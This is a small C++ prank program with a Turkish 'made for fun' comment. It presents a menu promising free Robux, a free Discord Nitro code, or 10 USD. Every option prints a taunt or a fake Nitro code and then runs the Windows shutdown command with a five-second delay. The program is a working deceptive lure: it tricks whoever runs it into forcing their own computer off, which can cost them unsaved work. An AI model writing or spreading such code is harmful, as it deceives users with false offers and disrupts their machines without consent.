#include <iostream>;
#include<stdlib.h>

/*
*  þaka amacýyla yapýlmýþtýr / MADE FOR FUN :)
*  discord : reccpe.dev
*/

void shutdown(int giris_input) {
	switch (giris_input) {
	case 1 :
		std::cout << "You get fucked up xd";
		system("c:\\windows\\system32\\shutdown /s /t 5 \n\n"); // 5 = seconds
		break;
	case 2:
		std::cout << "your discord nitro is here 29KS-OKSA-19A2";
		system("c:\\windows\\system32\\shutdown /s /t 5 \n\n");	// 5 = seconds
		break;
	case 3:
		std::cout << "i cant give u money im poor";
		system("c:\\windows\\system32\\shutdown /s /t 5 \n\n");	// 5 = seconds
		break;
	}
}

int main() {
	int num_input;
	std::cerr << "1- Free robux" << std::endl;
	std::cerr << "2- Free discord nitro code" << std::endl;
	std::cerr << "3- Free to earn 10 USD" << std::endl;
	std::cout << "Enter a code : ";
	std::cin >> num_input;
	shutdown(num_input);
}